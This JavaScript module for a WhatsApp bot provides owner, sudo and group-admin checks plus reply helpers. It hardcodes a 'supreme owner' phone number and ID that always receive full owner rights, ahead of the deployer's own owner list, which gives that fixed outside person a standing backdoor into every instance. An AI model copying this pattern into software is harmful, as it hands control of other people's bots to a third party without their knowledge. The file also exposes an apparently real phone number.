import { getMode, isSudoNumber, OWNER_FILE } from './config.js';
import fs from 'fs';

// ─── SUPREME OWNER CONFIG ───
const SUPREME_OWNER_PHONE = '2347080363698'; // Lord Xaven JID
const SUPREME_OWNER_LID = '104991213772828'; // Lord Xaven LID

// ─── OWNER & SUDO HELPERS ───

export function loadOwners() {
    try {
        if (fs.existsSync(OWNER_FILE)) {
            return JSON.parse(fs.readFileSync(OWNER_FILE, 'utf-8'));
        }
    } catch {}
    return [];
}

export function extractRawId(jid) {
    if (!jid) return null;
    return String(jid).split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
}

export async function getRealJid(jid, sock) {
    if (!jid) return jid;
    
    if (jid.endsWith('@s.whatsapp.net')) {
        return jid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
    }

    if (jid.endsWith('@lid')) {
        try {
            const pn = await sock.signalRepository?.lidMapping?.getPNForLID(jid);
            if (pn) {
                return pn.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
            }
        } catch (err) {}
    }
    
    return jid.split('@')[0].split(':')[0].replace(/[^0-9]/g, '');
}

export async function isOwner(m, sock) {
    if (!m?.key) return false;

    // Get all possible ID formats for the sender
    let senderJid = m.key.participant || (m.key.fromMe ? sock.user.id : m.key.remoteJid);
    const senderId = await getRealJid(senderJid, sock);
    const senderPn = m.key.senderPn ? m.key.senderPn.split('@')[0] : null;
    const rawId = extractRawId(senderJid);

    // 1. Check if it's the Supreme Owner (You)
    if (senderId === SUPREME_OWNER_PHONE || senderPn === SUPREME_OWNER_PHONE || rawId === SUPREME_OWNER_PHONE) return true;
    if (senderId === SUPREME_OWNER_LID || senderPn === SUPREME_OWNER_LID || rawId === SUPREME_OWNER_LID) return true;

    // 2. Check if it's the bot's own number (the person who paired it)
    const botNumber = extractRawId(sock.user.id);
    if (senderId === botNumber || senderPn === botNumber || rawId === botNumber) return true;

    // 3. Check against the local owner.json file
    const owners = loadOwners();
    if (senderId && owners.includes(senderId)) return true;
    if (senderPn && owners.includes(senderPn)) return true;
    if (rawId && owners.includes(rawId)) return true;

    return false;
}

export async function isSudo(m, sock) {
    if (await isOwner(m, sock)) return true;
    
    let senderJid = m.key.participant || m.key.remoteJid;
    const senderId = await getRealJid(senderJid, sock);
    const rawId = extractRawId(senderJid);
    
    if (senderId && isSudoNumber(senderId)) return true;
    if (rawId && isSudoNumber(rawId)) return true;
    
    return false;
}

export async function canUse(m, plugin, sock) {
    const owner = await isOwner(m, sock);
    if (owner) return { ok: true };

    const sudo = await isSudo(m, sock);
    if (sudo) return { ok: true };

    if (plugin.ownerOnly) return { ok: false, reason: 'owner_only' };

    const mode = getMode();
    if (mode === 'public') return { ok: true };

    return { ok: false, reason: 'private_mode' };
}

// ─── GROUP METADATA & ADMIN HELPERS ───

export async function getGroupMetadata(sock, groupId, retries = 3) {
    for (let i = 0; i < retries; i++) {
        try {
            return await sock.groupMetadata(groupId);
        } catch (err) {
            if (i === retries - 1) throw err;
            await new Promise(r => setTimeout(r, 1000));
        }
    }
}

export async function isSenderAdmin(sock, groupId, participantJid, metadata = null) {
    if (!metadata) metadata = await getGroupMetadata(sock, groupId);
    
    // Resolve the sender's LID to a real phone number (if possible)
    const realSenderNumber = await getRealJid(participantJid, sock);
    const senderNumber = extractRawId(participantJid);
    
    const sender = metadata.participants.find(p => {
        const pId = extractRawId(p.id);
        const pPn = extractRawId(p.phoneNumber);
        
        return p.id === participantJid || 
               p.phoneNumber === participantJid ||
               pId === senderNumber ||
               pPn === senderNumber ||
               pId === realSenderNumber ||
               pPn === realSenderNumber;
    });

    return sender?.admin === 'admin' || sender?.admin === 'superadmin';
}

export async function isBotAdmin(sock, groupId, metadata = null) {
    if (!metadata) metadata = await getGroupMetadata(sock, groupId);
    
    const botNumber = extractRawId(sock.user.id);
    
    const bot = metadata.participants.find(p => {
        const pId = extractRawId(p.id);
        const pPn = extractRawId(p.phoneNumber);
        
        return pId === botNumber || pPn === botNumber;
    });

    return bot?.admin === 'admin' || bot?.admin === 'superadmin';
}

// ─── REPLY HELPERS ───

export async function reply(sock, m, text) {
    return sock.sendMessage(m.key.remoteJid, { text }, { quoted: m });
}

export async function react(sock, m, emoji) {
    return sock.sendMessage(m.key.remoteJid, { react: { text: emoji, key: m.key } });
}